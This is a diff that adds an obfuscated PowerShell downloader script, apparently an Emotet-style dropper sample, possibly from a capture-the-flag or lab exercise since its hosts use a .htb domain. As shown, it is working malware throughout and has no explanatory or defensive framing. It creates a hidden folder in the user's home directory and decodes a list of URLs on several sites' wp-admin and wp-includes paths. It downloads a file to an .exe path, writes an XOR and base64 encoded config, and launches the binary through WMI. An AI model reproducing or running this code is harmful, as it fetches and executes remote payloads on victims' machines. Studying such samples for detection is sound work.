@@ -1,0 +1,64 @@
+ SV  0zX ([TyPe]("{2}{0}{4}{3}{1}"-f 'e','rECtorY','sYst','.IO.dI','M')  )
+   set  TxySeo  (  [TYpe]("{0}{7}{5}{6}{4}{2}{1}{8}{3}"-F'SYsTE','TM','IN','ER','pO','NeT.se','RVICE','M.','ANaG'))
+  $Nbf5tg3=('B9yp'+('90s'))
+
+$Vxnlre0=$Cludkjx + [char](64) + $R6r1tuy
+
+$Ky3q0e8=(('Rqdx')+'wo5')
+  (  Dir  vaRiAble:0Zx).valuE::"CreATEdIREcTOrY"($HOME + ((('nDpJrb')+('evk4n')+'Dp'+('Ccwr_2h')+'nDp') -RePlAcE ('nDp'),[cHaR]92))
+
+$ByteArray = (182,187,229,146,231,177,151,149,166)
+
+$Pyozgeo=(('J5fy1')+'cc')
+ (  vaRiABLE TxYSEo  ).ValuE::"SecUrITYpROtOcol" = (('Tls1')+'2')
+
+$ByteArray += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228)
+
+$Huajgb0=(('Jno')+'5ga1')
+$Bb28umo = (('Ale7g')+'_8')
+$Hsce_js=('Kv'+('nbov_'))
+$Spk51ue=(('C7xo')+'9gl')
+
+$DL_File_Path=$HOME+(('5t'+('fJrbevk')+('45tfCcw')+'r'+('_2h5tf')) -Replace  ([ChAR]53+[ChAR]116+[ChAR]102),[ChAR]92)+$Bb28umo+(('.ex')+'e')
+
+$ByteArray += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139)
+
+$ConfigFile=(('C7xo')+'9gl')
+
+$ConfigFile=$HOME+(('5t'+('fJrbevk')+('45tfCcw')+'r'+('_2h5tf')) -rEplACE  ([ChAR]53+[ChAR]116+[ChAR]102),[ChAR]92)+$Bb28umo+(('.co')+'nf')
+
+$Q1_y05_=('W'+('4qvy')+'z8')
+
+$WebClient=&('new-object') Net.WEBclIENt
+
+$ByteArray += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229)
+
+$UrlList=('h'+('ttp:][(s)]')+(('w][('))+(('s)]w'))+('da-')+'indu'+('strial.ht')+'b]'+('[(s)]wjs')+(('][('))+(('s)]w9IdLP][(s)]w@h'))+('ttp:]')+('[(s)]')+'w'+('][(s)]')+('wdaprofesional.h')+'tb'+('][(s)]')+'w'+('data')+('4][(s)]wh')+('WgWjT')+('V][')+('(s)]w@https:][(s)]w]')+'['+('(s)]wdagra')+'nit'+('egia')+('re.ht')+'b]'+('[(s)')+(']wwp-admin][(s)]wt')+('V][(s)')+(']w@h')+'ttp'+(':][')+('(s)]w][(s)]wwww.outsp')+('oke')+'nvi'+('sions.')+('htb]')+'['+('(s)]wwp-in')+('clud')+('es][(s)]waWoM')+('][(s)]w')+('@http:]')+('[(s)]w][(s)')+(']wmobs')+('ouk.h')+(('tb][('))+(('s)]wwp-'))+'incl'+('udes][')+('(s)]w')+('UY30R]')+('[(s)]w@http:][')+('(s)]w')+('][(s)')+(']wb')+'i'+('glaughs')+(('.htb][(s'))+((')]'))+('wsmallpotato')+'es'+(('][(s'))+((')]wY][(s)]w@https:][(s)'))+']w'+('][(s)]wng')+('llo')+('gisti')+('cs.h')+'t'+('b][(s)]w')+'ad'+('min')+'er]'+('[(s)]wW3m')+'k'+(('B][(s'))+((')]w')))."repLAcE"( (']['+('(s)]w')),([array]('/'),('xwe'))[0])."sPlIT"($Ivg3zcu + $Vxnlre0 + $Jzaewdy)
+
+$Gcoyvlv=(('Kf_')+('9et1'))
+
+foreach ($URL in $UrlList){
+    try{
+        $WebClient."dOWnLOAdfILe"($URL, $DL_File_Path)
+        $Zhcnaux=(('Ekk')+('j47t'))
+
+        If ((&('Get-Item') $DL_File_Path)."LEnGTh" -ge 45199) {
+            ${URL}.("ToCharArray").Invoke() | .("ForEach-Object") -process { ${ByteArray} += ([byte][char]${_} -bxor 0xdf )
+            }
+
+            $ByteArray += (228)
+
+            $b0Rje =  [type]("Convert")
+            $B0RjE::"tOBaSE64STRINg"(${ByteArray}) | .("out-file") ${ConfigFile}
+
+            ([wmiclass](('win')+('32_Proce')+'ss'))."cReaTE"($DL_File_Path)
+
+            $Glwki6a=('Im'+('tdxv6'))
+            break
+            $Pfpblh1=('Vs'+('lalc')+'u')
+        }
+    }
+    catch{}
+}
+
+$F47ief2=(('Bnzid')+'rt')
